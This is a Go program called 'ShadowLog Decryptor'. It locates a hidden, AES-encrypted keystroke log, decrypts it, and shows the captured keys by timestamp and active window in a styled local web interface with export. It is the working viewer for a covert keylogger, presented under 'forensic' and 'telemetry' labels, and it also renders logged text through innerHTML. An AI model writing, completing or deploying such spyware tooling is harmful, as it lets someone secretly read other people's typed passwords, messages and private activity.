package main

import (
	"bufio"
	"context"
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html/template"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	"shadowlog/config"
	"strings"
	"sync"
)

var (
	lastHeartbeat = time.Now()
	heartbeatMu   sync.Mutex
)

type LogEntry struct {
	Timestamp string
	Window    string
	Key       string
}

func main() {
	// ShadowLog Decryptor: Automatically finds and decrypts the hidden local log file.
	// This version uses a web-based UI for a premium, non-terminal experience.

	logPath := config.GetStoragePath()

	// Start local server for the UI.
	mux := http.NewServeMux()
	server := &http.Server{Addr: ":58292", Handler: mux}

	// Watchdog goroutine to shutdown if heartbeat stops
	go func() {
		for {
			time.Sleep(5 * time.Second)
			heartbeatMu.Lock()
			elapsed := time.Since(lastHeartbeat)
			heartbeatMu.Unlock()
			if elapsed > 12*time.Second {
				fmt.Println("No heartbeat received for 12s. Shutting down Decryptor...")
				server.Shutdown(context.Background())
				return
			}
		}
	}()

	mux.HandleFunc("/heartbeat", func(w http.ResponseWriter, r *http.Request) {
		heartbeatMu.Lock()
		lastHeartbeat = time.Now()
		heartbeatMu.Unlock()
		w.WriteHeader(http.StatusOK)
	})

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		entries := loadLogs(logPath)
		tmpl := template.Must(template.New("decryptor").Funcs(template.FuncMap{
			"split": func(s, sep string) []string {
				parts := strings.Split(s, sep)
				return parts
			},
		}).Parse(htmlContent))
		tmpl.Execute(w, map[string]interface{}{
			"Entries": entries,
			"Count":   len(entries),
			"Path":    logPath,
		})
	})

	// Handle shutdown
	mux.HandleFunc("/shutdown", func(w http.ResponseWriter, r *http.Request) {
		fmt.Fprint(w, "ShadowLog Decryptor is shutting down...")
		go func() {
			time.Sleep(1 * time.Second)
			server.Shutdown(context.Background())
		}()
	})

	// Handle data export (JSON)
	mux.HandleFunc("/export", func(w http.ResponseWriter, r *http.Request) {
		entries := loadLogs(logPath)
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("Content-Disposition", "attachment; filename=shadowlog_export.json")
		json.NewEncoder(w).Encode(entries)
	})

	fmt.Printf("Starting Shadow Log Decryptor UI at http://localhost:58292\n")
	
	go func() {
		time.Sleep(1 * time.Second)
		openBrowser("http://localhost:58292")
	}()

	if err := server.ListenAndServe(); err != http.ErrServerClosed {
		fmt.Printf("Server error: %v\n", err)
	}
}

func loadLogs(path string) []LogEntry {
	file, err := os.Open(path)
	if err != nil {
		return nil
	}
	defer file.Close()

	var rawEntries []LogEntry
	scanner := bufio.NewScanner(file)
	firstLine := true
	for scanner.Scan() {
		if firstLine {
			firstLine = false
			continue
		}
		
		line := scanner.Text()
		if line == "" {
			continue
		}

		data, err := base64.StdEncoding.DecodeString(line)
		if err != nil {
			continue
		}

		decrypted, err := decrypt(data)
		if err != nil {
			continue
		}

		s := string(decrypted)
		// SPLIT BATCHED LOGS: The monitor batches 3+ strokes per line.
		lines := strings.Split(s, "\n")
		for _, rawLine := range lines {
			if rawLine == "" {
				continue
			}
			
			entry := LogEntry{Key: rawLine} 
			
			// Expected format: [TIMESTAMP] [WINDOW] MESSAGE
			if len(rawLine) > 22 && rawLine[0] == '[' && rawLine[20] == ']' {
				entry.Timestamp = rawLine[1:20]
				remaining := rawLine[22:]
				if idx := strings.Index(remaining, "] "); idx != -1 && remaining[0] == '[' {
					entry.Window = remaining[1:idx]
					// CRITICAL FIX: Strip the metadata from the Key column entirely.
					entry.Key = remaining[idx+2:]
				}
			}
			rawEntries = append(rawEntries, entry)
		}
	}

	// Ungrouped return for maximum granularity ("don't limit").
	if len(rawEntries) == 0 {
		return nil
	}

	// Reverse to show newest logs first
	for i, j := 0, len(rawEntries)-1; i < j; i, j = i+1, j-1 {
		rawEntries[i], rawEntries[j] = rawEntries[j], rawEntries[i]
	}

	return rawEntries
}

func decrypt(data []byte) ([]byte, error) {
	key := config.GetEncryptionKey()
	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return nil, err
	}
	nonceSize := gcm.NonceSize()
	if len(data) < nonceSize {
		return nil, fmt.Errorf("ciphertext too short")
	}
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func openBrowser(url string) {
	var err error
	switch runtime.GOOS {
	case "windows":
		cmd := exec.Command("rundll32", "url.dll,FileProtocolHandler", url)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		err = cmd.Start()
	case "linux":
		err = exec.Command("xdg-open", url).Start()
	case "darwin":
		err = exec.Command("open", url).Start()
	}
	if err != nil {
		fmt.Printf("Error opening browser: %v\n", err)
	}
}

const htmlContent = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Shadow Log Decryptor</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=JetBrains+Mono&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary: #0078d4;
            --primary-glow: rgba(0, 120, 212, 0.3);
            --bg: #050505;
            --card-bg: rgba(20, 20, 20, 0.7);
            --card-border: rgba(255, 255, 255, 0.08);
            --text-main: #ffffff;
            --text-dim: #a1a1a1;
            --accent: #ff4d4d;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background-color: var(--bg);
            background-image: 
                radial-gradient(at 0% 0%, rgba(0, 120, 212, 0.1) 0px, transparent 50%),
                radial-gradient(at 100% 100%, rgba(20, 20, 20, 1) 0px, transparent 50%);
            color: var(--text-main);
            min-height: 100vh;
            padding: 48px 24px;
            line-height: 1.6;
        }

        .container { max-width: 1200px; margin: 0 auto; }
        
        .header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 48px;
            background: rgba(255,255,255,0.02);
            padding: 24px 32px;
            border-radius: 24px;
            border: 1px solid var(--card-border);
            backdrop-filter: blur(20px);
        }

        .logo-box {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .icon {
            width: 56px;
            height: 56px;
            background: linear-gradient(135deg, rgba(0, 120, 212, 0.2), rgba(0, 120, 212, 0.05));
            border: 1px solid var(--card-border);
            border-radius: 16px;
            display: flex;
            justify-content: center;
            align-items: center;
            color: var(--primary);
            box-shadow: 0 10px 30px -10px var(--primary-glow);
        }

        h1 { font-size: 1.5rem; font-weight: 800; letter-spacing: -0.04em; margin-bottom: 2px; }
        .stats { font-size: 0.8125rem; color: var(--text-dim); display: flex; align-items: center; gap: 12px; font-weight: 500; }
        .path-pill { background: rgba(255,255,255,0.05); padding: 4px 10px; border-radius: 8px; font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--primary); border: 1px solid rgba(0, 120, 212, 0.1); }

        .controls {
            margin-bottom: 32px;
        }

        .search-box {
            position: relative;
            max-width: 600px;
        }
        .search-box input {
            width: 100%;
            background: var(--card-bg);
            border: 1px solid var(--card-border);
            border-radius: 16px;
            padding: 16px 20px 16px 52px;
            color: white;
            font-size: 0.9375rem;
            outline: none;
            transition: all 0.3s;
            backdrop-filter: blur(10px);
        }
        .search-box input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(0, 120, 212, 0.1); }
        .search-icon { position: absolute; left: 20px; top: 50%; transform: translateY(-50%); color: var(--text-dim); }

        .btn {
            background: rgba(255, 255, 255, 0.05);
            border: 1px solid var(--card-border);
            color: #fff;
            padding: 12px 24px;
            border-radius: 14px;
            text-decoration: none;
            font-weight: 700;
            font-size: 0.875rem;
            transition: all 0.2s;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }
        .btn:hover { background: rgba(255, 255, 255, 0.1); transform: translateY(-1px); border-color: var(--primary); }
        
        .log-container {
            display: flex;
            flex-direction: column;
            gap: 16px;
        }

        .log-row {
            display: grid;
            grid-template-columns: 320px 1fr;
            gap: 0;
            background: var(--card-bg);
            backdrop-filter: blur(24px);
            border: 1px solid var(--card-border);
            border-radius: 20px;
            overflow: hidden;
            transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
            animation: slideIn 0.5s cubic-bezier(0.16, 1, 0.3, 1) forwards;
            opacity: 0;
            transform: translateY(10px);
        }

        @keyframes slideIn {
            to { opacity: 1; transform: translateY(0); }
        }

        .log-row:hover {
            border-color: var(--primary);
            box-shadow: 0 20px 40px -10px rgba(0, 0, 0, 0.5);
        }

        .meta-col {
            padding: 24px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid var(--card-border);
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .data-col {
            padding: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
        }

        .ts { 
            color: var(--text-dim); 
            font-family: 'JetBrains Mono', monospace; 
            font-size: 0.75rem; 
            font-weight: 600;
            display: flex;
            align-items: center;
            gap: 8px;
        }
        .ts::before {
            content: '';
            width: 6px; height: 6px;
            background: var(--primary);
            border-radius: 50%;
        }
        
        .location-badge {
            display: inline-flex;
            align-items: center;
            gap: 8px;
            background: rgba(0, 120, 212, 0.1);
            border: 1px solid rgba(0, 120, 212, 0.2);
            padding: 6px 12px;
            border-radius: 10px;
            color: var(--primary);
            font-weight: 700;
            font-size: 0.8125rem;
            width: fit-content;
            letter-spacing: -0.01em;
        }

        .location-badge.system {
            background: rgba(255, 77, 77, 0.1);
            border-color: rgba(255, 77, 77, 0.2);
            color: var(--accent);
        }

        .win-title {
            font-size: 0.8125rem;
            color: var(--text-dim);
            line-height: 1.5;
            font-weight: 500;
            overflow: hidden;
            display: -webkit-box;
            -webkit-line-clamp: 2;
            -webkit-box-orient: vertical;
        }
        
        .key-data { 
            font-family: 'JetBrains Mono', monospace; 
            color: #fff; 
            line-height: 1.8;
            word-wrap: break-word;
            white-space: pre-wrap;
            font-size: 0.9375rem;
            letter-spacing: -0.02em;
        }

        .special-key {
            background: rgba(255, 255, 255, 0.1);
            color: var(--primary);
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 0.7rem;
            font-weight: 800;
            margin: 0 4px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            text-transform: uppercase;
            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
        }
        
        .empty { padding: 120px 0; text-align: center; color: var(--text-dim); }
        
        @keyframes pulse {
            0% { opacity: 0.4; }
            50% { opacity: 1; }
            100% { opacity: 0.4; }
        }
        .active-dot {
            width: 8px; height: 8px; background: #2ecc71; border-radius: 50%;
            display: inline-block; animation: pulse 2s infinite;
            box-shadow: 0 0 10px #2ecc71;
        }

        /* Hide Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.1); border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(255,255,255,0.2); }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo-box">
                <div class="icon">
                    <svg xmlns="http://www.w3.org/2000/svg" width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M17.5 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM15 9.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.7 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.7-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.7 0 .3.1.5.3.7.2.2.5.3.7.3zM11 19c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM6.5 15.5c.3 0 .5-.1.7-.3.2-.2.3-.5.3-.8 0-.3-.1-.5-.3-.7-.2-.2-.5-.3-.8-.3-.3 0-.5.1-.7.3-.2.2-.3.5-.3.8 0 .3.1.5.3.7.2.2.5.3.8.3zM21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
                </div>
                <div>
                    <h1>Shadow Log Decryptor</h1>
                    <div class="stats">
                        <span class="active-dot"></span>
                        {{ .Count }} Forensic Sessions
                        <span class="path-pill">{{ .Path }}</span>
                    </div>
                </div>
            </div>
            <div style="display: flex; gap: 16px;">
                <a href="/export" class="btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"></path><polyline points="7 10 12 15 17 10"></polyline><line x1="12" y1="15" x2="12" y2="3"></line></svg>
                    Export Artifacts
                </a>
                <button onclick="window.location.reload()" class="btn">
                    <svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M23 4v6h-6"></path><path d="M20.49 15a9 9 0 1 1-2.12-9.36L23 10"></path></svg>
                    Flush Cache
                </button>
            </div>
        </div>

        <div class="controls">
            <div class="search-box">
                <svg class="search-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line></svg>
                <input type="text" id="searchInput" placeholder="Filter by window title or artifact content..." onkeyup="filterLogs()">
            </div>
        </div>

        <div class="log-container" id="logTable">
            {{ if .Entries }}
            {{ range .Entries }}
            <div class="log-row">
                <div class="meta-col">
                    <span class="ts">{{ .Timestamp }}</span>
                    <div class="location-badge {{ if eq .Window "System" }}system{{ end }}">
                        {{ if eq .Window "System" }}
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
                        CORE SYSTEM
                        {{ else }}
                        <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="3" width="20" height="14" rx="2" ry="2"></rect><line x1="8" y1="21" x2="16" y2="21"></line><line x1="12" y1="17" x2="12" y2="21"></line></svg>
                        {{ if index (split .Window " - ") 0 }}{{ index (split .Window " - ") 0 }}{{ else }}Background Process{{ end }}
                        {{ end }}
                    </div>
                    {{ if ne .Window "System" }}
                    <span class="win-title" title="{{ .Window }}">
                        {{ if index (split .Window " - ") 1 }}{{ index (split .Window " - ") 1 }}{{ else }}{{ .Window }}{{ end }}
                    </span>
                    {{ end }}
                </div>
                <div class="data-col">
                    <div class="key-data">{{ .Key }}</div>
                </div>
            </div>
            {{ end }}
            {{ else }}
            <div class="empty">
                <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="margin-bottom: 24px; opacity: 0.2; color: var(--primary);"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path><polyline points="14 2 14 8 20 8"></polyline><circle cx="9" cy="15" r="1"/><circle cx="15" cy="15" r="1"/></svg>
                <p>No telemetry data found in local storage.</p>
                <p style="font-size: 0.875rem; margin-top: 12px; opacity: 0.6; font-weight: 500;">Shadow Log must be active to generate logs.</p>
            </div>
            {{ end }}
        </div>
    </div>

    <script>
        // Heartbeat mechanism to keep server alive
        setInterval(async () => {
            try {
                await fetch('/heartbeat');
            } catch (e) {
                console.log('Server unreachable');
            }
        }, 2000);

        function filterLogs() {
            const input = document.getElementById('searchInput');
            const filter = input.value.toUpperCase();
            const rows = document.getElementsByClassName('log-row');

            for (let i = 0; i < rows.length; i++) {
                const badge = rows[i].getElementsByClassName('location-badge')[0];
                const title = rows[i].getElementsByClassName('win-title')[0];
                const key = rows[i].getElementsByClassName('key-data')[0];
                
                const badgeText = badge ? badge.textContent : "";
                const titleText = title ? title.textContent : "";
                const keyText = key ? key.textContent : "";
                
                const txtValue = badgeText + " " + titleText + " " + keyText;
                if (txtValue.toUpperCase().indexOf(filter) > -1) {
                    rows[i].style.display = "";
                } else {
                    rows[i].style.display = "none";
                }
            }
        }

        // Format special keys to look like tags
        document.querySelectorAll('.key-data').forEach(cell => {
            cell.innerHTML = cell.textContent.replace(/\[(.*?)\]/g, '<span class="special-key">$1</span>');
        });
    </script>
</body>
</html>
`
